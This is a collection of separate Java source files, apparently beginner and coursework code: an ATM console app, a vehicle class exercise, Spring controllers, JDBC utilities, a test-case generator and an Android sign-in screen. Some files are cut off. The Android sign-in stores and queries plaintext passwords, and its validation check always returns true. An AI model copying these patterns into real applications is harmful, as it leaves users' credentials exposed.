    "// These is a Normal InterFace of ATM Server in Java Development...\n// These Application was Developed by : [ Github Account = Harshal-25C ]\n\nimport java.util.Scanner;\n\nclass BankAccount \n{\n\n    String name;\n    String userName;\n    String password;\n    String accountNo;\n    float balance = 100000f;\n    int transactions = 0;\n    String transactionHistory = \"\";\n\n    // BankAccount(String name, String userName, String password, String accountNo) {\n    // this.name = name;\n    // this.userName = userName;\n    // this.password = password;\n    // this.accountNo = accountNo;\n    // }\n\n    public void register() {\n        Scanner sc = new Scanner(System.in);\n        System.out.print(\"\\n>> Enter Your Name : \\n\");\n        this.name = sc.nextLine();\n        System.out.print(\"\\n>> Enter Your Username : \\n\");\n        this.userName = sc.nextLine();\n        System.out.print(\"\\n>> Enter Your Password : \\n\");\n        this.password = sc.nextLine();\n        System.out.print(\"\\n>> Enter Your Account Number : \\n\");\n        this.accountNo = sc.nextLine();\n        System.out.println(\"\\n[ Registration completed...kindly login please! ]\\n\");\n        \n    }\n\n    public boolean login() {\n        boolean isLogin = false;\n        Scanner sc = new Scanner(System.in);\n        while ( !isLogin ) {\n            System.out.print(\"\\n>> Enter Your Username : \\n\");\n            String Username = sc.nextLine();\n            if ( Username.equals(userName) ) {\n                while ( !isLogin ) {\n                    System.out.print(\"\\n>> Enter Your Password : \\n\");\n                    String Password = sc.nextLine();\n                    if ( Password.equals(password) ) {\n                        System.out.print(\"\\n[ You're Login successfully! ]\");\n                        isLogin = true;\n                    }\n                    else {\n                        System.out.println(\"\\n**[ Incorrect Password! ]**\");\n                    }\n                }\n            }\n            else {\n                System.out.println(\"\\n**[ Username not found ]**\");\n            }\n        }\n\n        \n        return isLogin;\n    }\n\n    public void withdraw() {\n\n        System.out.print(\"\\n>> Enter amount to withdraw : \\n\");\n        Scanner sc = new Scanner(System.in);\n        float amount = sc.nextFloat();\n        try {\n\n            if ( balance >= amount ) {\n                transactions++;\n                balance -= amount;\n                System.out.println(\"\\n[ Withdraw Successfully ]\");\n                String str = amount + \" Rs Withdrawed.\\n\";\n                transactionHistory = transactionHistory.concat(str);\n\n            }\n            else {\n                System.out.println(\"\\n[ Insufficient Balance ]\");\n            }\n\n        }\n        catch ( Exception e) {\n        }\n        \n    }\n\n    public void deposit() {\n\n        System.out.print(\"\\n>> Enter amount to deposit : \\n\");\n        Scanner sc = new Scanner(System.in);\n        float amount = sc.nextFloat();\n\n        try {\n            if ( amount <= 100000f ) {\n                transactions++;\n                balance += amount;\n                System.out.println(\"\\n[ Successfully Deposited ]\");\n                String str = amount + \" Rs deposited.\\n\";\n                transactionHistory = transactionHistory.concat(str);\n            }\n            else {\n                System.out.println(\"\\n**[ Sorry...Limit is 100000.00 ]**\");\n            }\n\n        }\n        catch ( Exception e) {\n        }\n        \n    }\n\n    public void transfer() {\n\n        Scanner sc = new Scanner(System.in);\n        System.out.print(\"\\n>> Enter Receipent's Name : \");\n        String receipent = sc.nextLine();\n        System.out.print(\"\\n>> Enter amount to transfer : \");\n        float amount = sc.nextFloat();\n\n        try {\n            if ( balance >= amount ) {\n                if ( amount <= 50000f ) {\n                    transactions++;\n                    balance -= amount;\n                    System.out.println(\"\\n**[ Successfully Transfered to \" + receipent + \" ]**\");\n                    String str = amount + \" Rs transfered to \" + receipent + \".\\n\";\n                    transactionHistory = transactionHistory.concat(str);\n                }\n                else {\n                    System.out.println(\"\\n**[ Sorry...Limit is 50000.00 ]**\");\n                }\n            }\n            else {\n                System.out.println(\"\\n[ Insufficient Balance ]\");\n            }\n        }\n        catch ( Exception e) {\n        }\n        \n    }\n\n    public void checkBalance() {\n        System.out.println(\"\\n**[ $ Total Amount is : \" + balance + \" Rs. ]**\");\n    }\n\n    public void transHistory() {\n        if ( transactions == 0 ) {\n            System.out.println(\"\\n**[ Empty ]**\");\n        }\n        else {\n            System.out.println(\"\\n---------------------------------\\n\");\n            System.out.println(\"\\n\" + transactionHistory);\n            System.out.println(\"\\n---------------------------------\\n\");\n        }\n    }\n}\n\npublic class Task_3 {",
    "\r\nimport java.util.Scanner;\r\n\r\nclass driver {\r\n    public String NoSIM;\r\n    public String nama;\r\n    public String TanggalLahir;\r\n}\r\n\r\nclass penumpang{\r\n    public String nama;\r\n    public penumpang(String nama){\r\n        this.nama= nama;\r\n    }\r\n}\r\n\r\nclass kendaraan {\r\n    public String MerkMobil;\r\n    public String WarnaMobil;\r\n    public String Platnomer;\r\n    public int JumlahPenumpang;\r\n    public int MaxPenumpang;\r\n\r\n    public driver supir;\r\n    public driver namaSupir;\r\n    public driver TanggalLahir;\r\n    public penumpang [] namaPenumpang;\r\n\r\n     public kendaraan(String m, String w, String pn, int max){\r\n        this.MerkMobil= m;\r\n        this.WarnaMobil= w;\r\n        this.Platnomer= pn;\r\n        this.JumlahPenumpang= 0;\r\n        this.MaxPenumpang= max;\r\n        this.namaPenumpang= new penumpang[max];\r\n        System.out.println(\"Merk: \" + this.MerkMobil + \"\\nWarna: \" + this.WarnaMobil + \"\\nPlat Nomor: \" + this.Platnomer);\r\n        \r\n        System.out.println(\"Jumlah penumpang: \" + this.JumlahPenumpang + \"\\nMaximal penumpang: \" + this.MaxPenumpang);\r\n    }\r\n\r\n    public void cekPenumpang(){\r\n        System.out.println(\"Penumpang saat ini adalah \" + this.JumlahPenumpang);\r\n    }\r\n    public void penumpangNaik(String nama){\r\n        if(this.JumlahPenumpang < MaxPenumpang){\r\n            this.namaPenumpang [this.JumlahPenumpang] = new penumpang(nama);\r\n            this.JumlahPenumpang++;\r\n            System.out.println(\"Penumpang bernama \" + nama + \" berhasil naik\");\r\n        }else System.out.println(\"Maaf penumpang sudah penuh\");\r\n\r\n        cekPenumpang();\r\n        \r\n    }\r\n    public void penumpangNaik(int naik){\r\n        System.out.println(\"ada penumpang ingin naik: \"+ naik);\r\n        int current = this.JumlahPenumpang;\r\n        if(current+ naik > MaxPenumpang){\r\n            System.out.println(\"Maaf kendaraan penuh\");\r\n        }else{\r\n            this.JumlahPenumpang+=naik;\r\n            System.out.println(\"penumpang berhasil naik\");\r\n        }\r\n        cekPenumpang();\r\n    }\r\n    public void penumpangTurun(int turun){\r\n        System.out.println(\"ada penumpang ingin naik: \"+ turun);\r\n        int current = this.JumlahPenumpang;\r\n        if(current-turun < 0){\r\n            System.out.println(\"Maaf kendaraan kosong tidak ada yang turun\");\r\n        }else{\r\n            this.JumlahPenumpang-=turun;\r\n            System.out.println(\"penumpang berhasil turun\");\r\n        }\r\n        cekPenumpang();\r\n    }\r\n\r\n    public void maju(){\r\n        System.out.println(this.MerkMobil + this.WarnaMobil + this.Platnomer + \" Sedang berjalan maju\");\r\n    }\r\n    public void mundur(){\r\n        System.out.println(this.MerkMobil + this.WarnaMobil + this.Platnomer + \" Sedang berjalan mundur\");\r\n    }\r\n    public void berhenti(){\r\n        System.out.println(this.MerkMobil + this.WarnaMobil + this.Platnomer + \" Sedang berhenti\");\r\n    }\r\n    public void namaSupir(){\r\n        System.out.println(\"Nama : \" + this.supir.nama);\r\n    }\r\n    public void TanggalLahir(){\r\n        System.out.println(\"Tanggal Lahir : \" + this.supir.TanggalLahir);\r\n    }\r\n    public void showSIM(){\r\n        System.out.println(\"No SIM : \" + this.supir.NoSIM);\r\n    }\r\n\r\n\r\n   static class truck extends kendaraan{\r\n    double kapasitasMuatan;\r\n     public truck (String m, String w, String pn, int max){\r\n        super(m, w, pn, max);\r\n        this.kapasitasMuatan= kapasitasMuatan;\r\n     }\r\n     public void kapasitasMuatan(){\r\n        System.out.println(\"Muatannya adalah \" + this.kapasitasMuatan + \"ton\");\r\n     }\r\n\r\n   }\r\n   static class bus extends kendaraan{\r\n    int cekToilet;\r\n     public bus (String m, String w, String pn, int max, int cekToilet){\r\n        super(m, w, pn, max);\r\n     }\r\n     void cekToilet(){\r\n        if(this.cekToilet == 1){\r\n            System.out.println(\"di dalam masih ada orang, silahkan tunggu\");\r\n        }else System.out.println(\"di dalam tidak ada orang, silahkan masuk\");\r\n        }\r\n     }\r\n   \r\n\r\n\r\n    public class LK02{\r\n        public static void main(String[] args) {\r\n            System.out.println(\"Jenis Kendaraan : Mobil\");\r\n            kendaraan m1 = new kendaraan(\"BMW \",\" Kuning \", \" N 6493 KO\", 5);\r\n             //Membuat Relasi Driver\r\n            driver s1 = new driver();\r\n            System.out.println(\"Biodata Supir : \");\r\n            s1.nama = \"Dimas Rezananda\";\r\n            s1.TanggalLahir = \"7 Maret 2005\";\r\n            s1.NoSIM = \"98237\";\r\n            m1.supir = s1;\r\n            m1.namaSupir();\r\n            m1.TanggalLahir();\r\n            m1.showSIM();\r\n            System.out.println(\"\");\r\n\r\n            System.out.println(\"Jenis Kendaraan : Truck\");\r\n            kendaraan.truck t1 = new truck (\"Hino\", \"Hijau\", \" B 1234 HG \", 3);\r\n             //Membuat Relasi Driver\r\n             driver s2 = new driver();\r\n            System.out.println(\"Biodata Supir : \");\r\n            s2.nama = \"Joko Pitono\";\r\n            s2.TanggalLahir = \"30 April 1970\";\r\n            s2.NoSIM = \"12345\";\r\n            t1.supir = s2;\r\n            t",
    "package team.haedal.gifticionfunding.controller;\n\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestBody;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\nimport team.haedal.gifticionfunding.dto.common.ResponseDto;\nimport team.haedal.gifticionfunding.dto.user.request.UserJoinRequest;\nimport team.haedal.gifticionfunding.dto.user.response.UserJoinResponse;\nimport team.haedal.gifticionfunding.service.user.UserService;\n\n@RestController\n@RequestMapping(\"/api/user\")\n@RequiredArgsConstructor\npublic class UserController {\n    private final UserService userService;\n\n    @PostMapping(\"/join\")\n    public ResponseEntity<?> join(@RequestBody UserJoinRequest userJoinRequest) {\n        UserJoinResponse userJoinResponse = userService.join(userJoinRequest);\n        return new ResponseEntity<>(\n                new ResponseDto<>(1, \"\ud68c\uc6d0\uac00\uc785 \uc131\uacf5\", userJoinResponse),\n                HttpStatus.CREATED\n        );\n    }\n}\n",
    "package db;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\nimport java.util.Properties;\n\npublic class DB {\n\t\n\tprivate static Connection conn = null;\n\t\n\tpublic static Connection getConnection() {\n\t\tif(conn == null) {\n\t\t\ttry {\n\t\t\t\tProperties props = loadProperties();\n\t\t\t\t\n\t\t\t\tString url = props.getProperty(\"dburl\");\n\t\t\t\t\n\t\t\t\tconn = DriverManager.getConnection(url, props);\n\t\t\t} catch(SQLException e) {\n\t\t\t\tthrow new DbException(e.getMessage());\n\t\t\t}\n\t\t}\n\t\t\n\t\treturn conn;\n\t}\n\t\n\tpublic static void closeConnection() {\n\t\tif(conn != null) {\n\t\t\ttry {\n\t\t\t\tconn.close();\t\t\t\t\n\t\t\t} catch (SQLException e) {\n\t\t\t\tthrow new DbException(e.getMessage());\n\t\t\t}\n\t\t}\n\t}\n\t\n\tpublic static void closeResultSet(ResultSet rs) {\n\t\tif(rs != null) {\n\t\t\ttry {\n\t\t\t\trs.close();\n\t\t\t} catch(SQLException e) {\n\t\t\t\tthrow new DbException(e.getMessage());\n\t\t\t}\n\t\t}\n\t}\n\t\n\tpublic static void closeStatement(Statement st) {\n\t\tif(st != null) {\n\t\t\ttry {\n\t\t\t\tst.close();\n\t\t\t} catch(SQLException e) {\n\t\t\t\tthrow new DbException(e.getMessage());\n\t\t\t}\n\t\t}\n\t}\n\n\tprivate static Properties loadProperties() {\n\t\ttry(FileInputStream fs = new FileInputStream(\"db.properties\")) {\n\t\t\tProperties props = new Properties();\n\t\t\tprops.load(fs);\n\t\t\t\n\t\t\treturn props;\n\t\t} catch(IOException e) {\n\t\t\tthrow new DbException(e.getMessage());\n\t\t}\n\t}\n}\n",
    "import java.io.FileWriter;\r\nimport java.io.IOException;\r\nimport java.nio.file.Files;\r\nimport java.nio.file.Path;\r\nimport java.nio.file.Paths;\r\nimport java.util.HashMap;\r\nimport java.util.Map;\r\nimport java.util.Random;\r\nimport java.util.zip.ZipEntry;\r\nimport java.util.zip.ZipOutputStream;\r\n\r\nenum TimeComplexity {\r\n    N(\"n\", (int) 1e8),\r\n    N_LOG_N(\"nlogn\", (int) 1e5),\r\n    N_SQUARED(\"n^2\", (int) 1e4),\r\n    EXPONENTIAL(\"2^n\", 20),\r\n    LOG_N(\"logn\", (int) 1e9),\r\n    SQRT_N(\"sqrt(n)\", (int) 1e9);\r\n\r\n    final String complexityOrder;\r\n    final int numInputs;\r\n\r\n    TimeComplexity(String complexityOrder, int numInputs) {\r\n        this.complexityOrder = complexityOrder;\r\n        this.numInputs = numInputs;\r\n    }\r\n}\r\n\r\npublic class TestCaseGenerator {\r\n    private static final String TEST_CASE_FOLDER = \"test_cases\";\r\n    private static final String INPUT_FOLDER = TEST_CASE_FOLDER + \"/in\";\r\n    private static final String OUTPUT_FOLDER = TEST_CASE_FOLDER + \"/out\";\r\n    private static final String ZIP_FILE = \"problem.zip\";\r\n\r\n    public static void main(String[] args) {\r\n        // ----------------- INPUT SIZE -----------------\r\n        TimeComplexity order = TimeComplexity.N_LOG_N;\r\n        int numInputs = order.numInputs / 2;\r\n\r\n        // ----------------- INPUT CONDITION -----------------\r\n        generateTestCases(\r\n            numInputs, //numInputs\r\n            1, //testCaseStart\r\n            1, //testCaseEnd\r\n            -100000, //numRangeMin\r\n            100000, //numRangeMax\r\n            2, //minNumOccurrences\r\n            20 //maxNumOccurrences\r\n        );\r\n    }\r\n\r\n    public static void generateTestCases(int numInputs, int testCaseStart, int testCaseEnd, int numRangeMin, int numRangeMax, int minNumOccurrences, int maxNumOccurrences) {\r\n        for (int i = testCaseStart; i <= testCaseEnd; i++) {\r\n            int[] arr = getRandomList(numInputs, numRangeMin, numRangeMax, minNumOccurrences, maxNumOccurrences);\r\n\r\n            String inputFileName = INPUT_FOLDER + \"/input\" + i + \".txt\";\r\n            String outputFileName = OUTPUT_FOLDER + \"/output\" + i + \".txt\";\r\n\r\n            generateInputFile(inputFileName, numInputs, arr);\r\n            generateOutputFile(outputFileName, arr);\r\n        }\r\n        zipFolders();\r\n    }\r\n\r\n    private static int getRandomNumber(int max, int min) {\r\n        return min + (int) (Math.random() * ((max - min) + 1));\r\n    }\r\n\r\n    private static int[] getRandomList(int len, int max, int min, int minOccurrences, int maxOccurrences) {\r\n        int[] randomList = new int[len];\r\n        Map<Integer, Boolean> seenNumbers = new HashMap<>();\r\n\r\n        int index = 0;\r\n        while (index < len) {\r\n            int potentialNumber = getRandomNumber(max, min);\r\n            if (!seenNumbers.containsKey(potentialNumber)) {\r\n                seenNumbers.put(potentialNumber, true);\r\n\r\n                int count = getRandomNumber(maxOccurrences, minOccurrences);\r\n                for (int i = 0; i < Math.min(count, len - index + 1); i++) {\r\n                    randomList[index++] = potentialNumber;\r\n                }\r\n            }\r\n        }\r\n\r\n        shuffleList(randomList);\r\n        return randomList;\r\n    }\r\n\r\n    private static void shuffleList(int[] randomList) {\r\n        Random rand = new Random();\r\n        int len = randomList.length;\r\n\r\n        for (int i = len - 1; i > 0; i--) {\r\n            int j = rand.nextInt(i + 1);\r\n            int temp = randomList[i];\r\n            randomList[i] = randomList[j];\r\n            randomList[j] = temp;\r\n        }\r\n    }\r\n\r\n    private static void generateInputFile(String fileName, int n, int[] arr) {\r\n        try {\r\n            Path inputPath = Paths.get(fileName);\r\n            Files.createDirectories(inputPath.getParent());\r\n            FileWriter writer = new FileWriter(fileName);\r\n            // ----------------- INPUT FORMAT -----------------\r\n            writer.write(n + \"\\n\");\r\n            for (int i = 0; i < n; i++) {\r\n                writer.write(arr[i] + \" \");\r\n            }\r\n            // ----------------- INPUT FORMAT -----------------\r\n            writer.close();\r\n        } catch (IOException e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    private static void generateOutputFile(String fileName, int[] arr) {\r\n        try {\r\n            Path outputPath = Paths.get(fileName);\r\n            Files.createDirectories(outputPath.getParent());\r\n            FileWriter writer = new FileWriter(fileName);\r\n            // ----------------- OUTPUT FORMAT -----------------\r\n            int ans = Solution.questionSolution(arr);\r\n            writer.write(String.valueOf(ans));\r\n            // ----------------- OUTPUT FORMAT -----------------\r\n            writer.close();\r\n        } catch (IOException e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    public static void zipFolders() {\r\n        try (ZipOutputStream zipOut = new ZipOutputStream(Files.newOutputStream(Paths.get(ZIP_FILE)))) {\r\n            addFolderToZip(INPUT_FOLDER",
    "package com.gateway.filter;\n\nimport org.springframework.cloud.gateway.filter.GatewayFilterChain;\nimport org.springframework.cloud.gateway.filter.GlobalFilter;\nimport org.springframework.cloud.gateway.support.ServerWebExchangeUtils;\nimport org.springframework.core.Ordered;\nimport org.springframework.http.HttpHeaders;\nimport org.springframework.http.HttpMethod;\nimport org.springframework.http.MediaType;\nimport org.springframework.http.codec.HttpMessageReader;\nimport org.springframework.http.server.reactive.ServerHttpRequest;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.reactive.function.server.HandlerStrategies;\nimport org.springframework.web.reactive.function.server.ServerRequest;\nimport org.springframework.web.server.ServerWebExchange;\nimport reactor.core.publisher.Mono;\n\nimport java.util.List;\n\n@Component\npublic class CachedBodyFilter implements GlobalFilter, Ordered {\n\n    public static final String CACHE_REQUEST_BODY_OBJECT_KEY = \"cachedRequestBodyObject\";\n\n    private final List<HttpMessageReader<?>> messageReaders = HandlerStrategies.withDefaults().messageReaders();\n\n\n    @SuppressWarnings(\"deprecation\")\n    @Override\n    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {\n        if (exchange.getAttribute(CACHE_REQUEST_BODY_OBJECT_KEY) != null) {\n            return chain.filter(exchange);\n        }\n        ServerHttpRequest request = exchange.getRequest();\n        HttpMethod method = request.getMethod();\n        String contentType = request.getHeaders().getFirst(HttpHeaders.CONTENT_TYPE);\n        if (HttpMethod.POST == method || HttpMethod.PUT == method) {\n            // POST\u6216PUT\u8bf7\u6c42\uff0c\u4e0b\u9762\u6307\u5b9a\u7684\u7c7b\u578b\u9700\u8981\u7f13\u5b58body\u6570\u636e\uff0c\u6587\u4ef6\u4e0a\u4f20\u4e4b\u7c7b\u7684\u8bf7\u6c42\u65e0\u9700\u7f13\u5b58\n            if (MediaType.APPLICATION_FORM_URLENCODED_VALUE.equalsIgnoreCase(contentType)\n                    || MediaType.APPLICATION_JSON_VALUE.equalsIgnoreCase(contentType)\n                    || MediaType.APPLICATION_JSON_UTF8_VALUE.equalsIgnoreCase(contentType)) {\n                return ServerWebExchangeUtils.cacheRequestBodyAndRequest(exchange,\n                        (serverHttpRequest) -> ServerRequest\n                                .create(exchange.mutate().request(serverHttpRequest).build(), messageReaders)\n                                .bodyToMono(String.class).doOnNext(objectValue -> exchange.getAttributes()\n                                        .put(CACHE_REQUEST_BODY_OBJECT_KEY, objectValue)).then(chain.filter(exchange)));\n            }\n        }\n        return chain.filter(exchange);\n    }\n\n    @Override\n    public int getOrder() {\n        return HIGHEST_PRECEDENCE;\n    }\n}\n",
    "package com.example.covcom.Controller;\n\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.SharedPreferences;\nimport android.os.Bundle;\nimport android.util.Log;\nimport android.widget.Toast;\n\nimport androidx.activity.EdgeToEdge;\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport com.example.covcom.Constants;\nimport com.example.covcom.databinding.ActivitySignInBinding;\nimport com.google.firebase.firestore.DocumentSnapshot;\nimport com.google.firebase.firestore.FirebaseFirestore;\nimport com.google.firebase.firestore.QueryDocumentSnapshot;\n\nimport java.util.HashMap;\n\npublic class SignInController extends AppCompatActivity {\n\n    private ActivitySignInBinding binding;\n\n    private SharedPreferences preferences;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        EdgeToEdge.enable(this);\n        binding = ActivitySignInBinding.inflate(getLayoutInflater());\n        setContentView(binding.getRoot());\n\n        setListeners();\n\n        preferences = getApplicationContext().getSharedPreferences(Constants.SHARED_PREFERENCE_KEY, Context.MODE_PRIVATE);\n\n\n    }\n\n    ;\n\n\n    private Boolean isValidLogin() {\n        if (binding.inputEmail.getText().toString().trim().isEmpty() || binding.inputPassword.getText().toString().trim().isEmpty()) {\n            showToast(\"Invalid Credentials. Please enter proper username/email and password\");\n        }\n\n        return true;\n    }\n\n    private void showToast(String text) {\n        Toast.makeText(getApplicationContext(), text, Toast.LENGTH_SHORT).show();\n    }\n\n    private void signIn() {\n        HashMap<String, Object> user = new HashMap<>();\n        FirebaseFirestore db = FirebaseFirestore.getInstance();\n        String email = binding.inputEmail.getText().toString();\n        String password = binding.inputPassword.getText().toString();\n\n        if (!isValidLogin()) showToast(\"Enter proper username/email and password\");\n\n        db.collection(Constants.DATABASE_USERS)\n                .whereEqualTo(Constants.DATABASE_USERNAME, email)\n                .whereEqualTo(Constants.DATABASE_PASSWORD, password)\n                .get()\n                .addOnCompleteListener(task -> {\n                    DocumentSnapshot documentResult  = task.getResult().getDocuments().get(0);\n                    if (task.isSuccessful() && task.getResult() != null && documentResult!=null) {\n                        Log.d(\"FCM\", \"Added user\");\n                        showToast(\"Logged in\");\n                        preferences.edit().putString(Constants.DATABASE_USERNAME, email).apply();\n                        preferences.edit().putString(Constants.DATABASE_PASSWORD, password).apply();\n                        preferences.edit().putString(Constants.KEY_USER_ID, documentResult.getId()).apply();\n\n                        startActivity(new Intent(getApplicationContext(), UserController.class));\n                    } else {\n                        showToast(\"Invalid Credentials\");\n                    }\n\n                })\n                .addOnFailureListener(exception -> {\n                    Log.d(\"FCM-f\", exception.toString());\n                    showToast(\"Failed to fetch data. Error 404\");\n                });\n    }\n\n    private void setListeners() {\n        binding.signInButton.setOnClickListener(v -> {\n                    Log.d(\"FCM-f\", \"Registered\");\n                    signIn();\n                }\n        );\n\n    }\n\n}",
    "import java.sql.*;\r\n\r\npublic class PatientInfo {\r\n    public static void main(String[] args) {\r\n        try {\r\n            // Step 1: Load the JDBC driver\r\n            Class.forName(\"oracle.jdbc.driver.OracleDriver\");\r\n\r\n            // Step 2: Establish a connection\r\n            Connection connection = DriverManager.getConnection(\r\n                    \"jdbc:oracle:thin:@localhost:1521:xe\", \"bhagiradhija\", \" \");\r\n\r\n            // Step 3: Create a statement\r\n            Statement statement = connection.createStatement();\r\n\r\n            // Step 4: Execute the query\r\n            ResultSet resultSet = statement.executeQuery(\"SELECT patient_id, name, problem, bill FROM patients\");\r\n\r\n            // Step 5: Process the results\r\n            while (resultSet.next()) {\r\n                int patientId = resultSet.getInt(\"patient_id\");\r\n                String name = resultSet.getString(\"name\");\r\n                String problem = resultSet.getString(\"problem\");\r\n                double bill = resultSet.getDouble(\"bill\");\r\n\r\n                System.out.println(\"Patient ID: \" + patientId);\r\n                System.out.println(\"Name: \" + name);\r\n                System.out.println(\"Problem: \" + problem);\r\n                System.out.println(\"Bill: \" + bill);\r\n                System.out.println(\"--------------------------------------\");\r\n            }\r\n\r\n            // Step 6: Close the connection\r\n            resultSet.close();\r\n            statement.close();\r\n            connection.close();\r\n\r\n        } catch (Exception e) {\r\n            System.err.println(\"Error: \" + e.getMessage());\r\n        }\r\n    }\r\n}\r\n",
    "package org.example.constants;\n\npublic class ErrorMessage {\n    public static final String CAPTCHA_ERROR = \"Fill captcha\";\n    public static final String EMAIL_NOT_FOUND = \"Email not found\";\n    public static final String PASSWORDS_DO_NOT_MATCH = \"Passwords do not match.\";\n    public static final String EMAIL_IN_USE = \"Email is already in use.\";\n    public static final String INVALID_PASSWORD_CODE = \"Password reset code is invalid!\";\n    public static final String ACTIVATION_CODE_NOT_FOUND = \"Activation code not found.\";\n    public static final String ORDER_NOT_FOUND = \"Order not found.\";\n    public static final String ARTIFACT_NOT_FOUND = \"Artifact not found.\";\n    public static final String USER_NOT_FOUND = \"User not found.\";\n    public static final String EMPTY_FIRST_NAME = \"First name cannot be empty\";\n    public static final String EMPTY_LAST_NAME = \"Last name cannot be empty\";\n    public static final String PASSWORD_CHARACTER_LENGTH = \"The password must be between 6 and 16 characters long\";\n    public static final String PASSWORD2_CHARACTER_LENGTH = \"The password confirmation must be between 6 and 16 characters long\";\n    public static final String INCORRECT_EMAIL = \"Incorrect email\";\n    public static final String EMAIL_CANNOT_BE_EMPTY = \"Email cannot be empty\";\n    public static final String FILL_IN_THE_INPUT_FIELD = \"Fill in the input field\";\n    public static final String EMPTY_PHONE_NUMBER = \"Phone number cannot be empty\";\n    public static final String EMPTY_POST_INDEX = \"Post index must contain 5 digits\";\n}\n",
    "package application;\n\nimport java.text.ParseException;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.Locale;\nimport java.util.Scanner;\n\nimport entities.Department;\nimport entities.HourContract;\nimport entities.Worker;\nimport entities.enums.WorkerLevel;\n\npublic class Program {\n\n\tpublic static void main(String[] args) throws ParseException {\n\t\t\n\t\tLocale.setDefault(Locale.US);\n\t\tScanner sc = new Scanner(System.in);\n\t\tSimpleDateFormat sdf = new SimpleDateFormat(\"dd/MM/yyyy\");\n\t\t\n\t\tSystem.out.print(\"Enter department's name: \");\n\t\tString departmentName = sc.nextLine();\n\t\tSystem.out.println(\"Enter worker data: \");\n\t\tSystem.out.print(\"Name: \");\n\t\tString workerName = sc.nextLine();\n\t\tSystem.out.print(\"Enter Level JUNIOR, MID_LEVEL or SENIOR: \");\n\t\tString workerLevel = sc.nextLine();\n\t\tSystem.out.print(\"Base Salary: \");\n\t\tdouble baseSalary = sc.nextDouble();\n\t\tWorker worker = new Worker(workerName, WorkerLevel.valueOf(workerLevel), \n\t\t\t\tbaseSalary, new Department(departmentName));\n\t\t\n\t\tSystem.out.print(\"How many contracts to this worker? \");\n\t\tint n = sc.nextInt();\n\t\t\n\t\tfor (int i=1; i<=n; i++){\n\t\t\tSystem.out.println(\"Enter contract #\" + i + \" data: \");\n\t\t\tSystem.out.print(\"Date (DD/MM/YYYY): \");\n\t\t\tDate contractDate = sdf.parse(sc.next());\n\t\t\tSystem.out.print(\"Value per hour: \");\n\t\t\tdouble valuePerHour = sc.nextDouble();\n\t\t\tSystem.out.print(\"Duration (hours): \");\n\t\t\tint hours = sc.nextInt();\n\t\t\tHourContract contract = new HourContract(contractDate, valuePerHour, hours);\n\t\t\tworker.addContract(contract);\n\t\t}\n\t\t\n\t\tSystem.out.println();\n\t\tSystem.out.print(\"Enter month and year to calculate income(MM/YYYY): \");\n\t\tString monthAndYear = sc.next();\n\t\tint month = Integer.parseInt(monthAndYear.substring(0, 2));\n\t\tint year = Integer.parseInt(monthAndYear.substring(3));\n\t\tSystem.out.println(\"Name: \" + worker.getName());\n\t\tSystem.out.println(\"Department: \" + worker.getDepartment().getName());\n\t\tSystem.out.println(\"Income for: \" + monthAndYear + \": \" + String.format(\"%.2f\",worker.income(year, month)));\n\t\t\n\t\t\n\t\tsc.close();\n\t}\n\n}\n",
    "package application;\n\nimport java.text.ParseException;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.Scanner;\n\nimport model.entities.Reservation;\nimport model.exceptions.DomainException;\n\npublic class Program {\n\n\tpublic static void main(String[] args) {\n\n\t\tScanner sc = new Scanner(System.in);\n\t\tSimpleDateFormat sdf = new SimpleDateFormat(\"dd/MM/yyyy\");\n\t\t\n\t\ttry {\n\t\t\tSystem.out.print(\"Room number: \");\n\t\t\tint number = sc.nextInt();\n\t\t\tSystem.out.print(\"Check-in date (dd/MM/yyyy): \");\n\t\t\tDate checkIn = sdf.parse(sc.next());\n\t\t\tSystem.out.print(\"Check-out date (dd/MM/yyyy): \");\n\t\t\tDate checkOut = sdf.parse(sc.next());\n\t\t\t\n\t\t\tReservation reservation = new Reservation(number, checkIn, checkOut);\n\t\t\tSystem.out.println(\"Reservation: \" + reservation);\n\t\t\t\n\t\t\tSystem.out.println();\n\t\t\tSystem.out.println(\"Enter data to update the reservation:\");\n\t\t\tSystem.out.print(\"Check-in date (dd/MM/yyyy): \");\n\t\t\tcheckIn = sdf.parse(sc.next());\n\t\t\tSystem.out.print(\"Check-out date (dd/MM/yyyy): \");\n\t\t\tcheckOut = sdf.parse(sc.next());\n\t\t\t\n\t\t\treservation.updateDates(checkIn, checkOut);\n\t\t\tSystem.out.println(\"Reservation: \" + reservation);\n\t\t}\n\t\tcatch (ParseException e) {\n\t\t\tSystem.out.println(\"Invalid date format\");\n\t\t}\n\t\tcatch (DomainException e) {\n\t\t\tSystem.out.println(\"Error in reservation: \" + e.getMessage());\n\t\t}\n\t\tcatch (RuntimeException e) {\n\t\t\tSystem.out.println(\"Unexpected error\");\n\t\t}\n\n\t\tsc.close();\n\t}\n}",
